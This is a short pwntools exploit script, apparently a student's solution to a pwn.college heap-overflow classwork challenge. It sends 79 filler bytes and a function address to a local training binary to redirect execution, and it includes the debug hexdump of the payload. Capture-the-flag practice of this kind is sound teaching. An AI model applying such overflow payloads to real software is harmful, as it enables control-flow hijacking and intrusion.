# Username: vasanth.vanan (pwn.college dojos)
# Title: Classwork challenge on heap overflows

# imported the 'pwntools' library
from pwn import *

# established the target binary with ELF with checksec turned OFF
context.binary = elf = ELF('./classwork', checksec=False)

context.log_level = 'DEBUG'

# created local process of the binary
p = process()

# sent the payload by choosing the first option 'Hoth'
# followed by the needed offset
# followed by the address of the function 'jumpToNaboo' 
p.sendline(b"1" + b"A" * 79 + p64(0x00000000004012bc))

# [DEBUG] Sent 0x59 bytes:
#     00000000  31 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │1AAA│AAAA│AAAA│AAAA│
#     00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
#     *
#     00000050  bc 12 40 00  00 00 00 00  0a                        │··@·│····│·│
#     00000059

p.interactive()
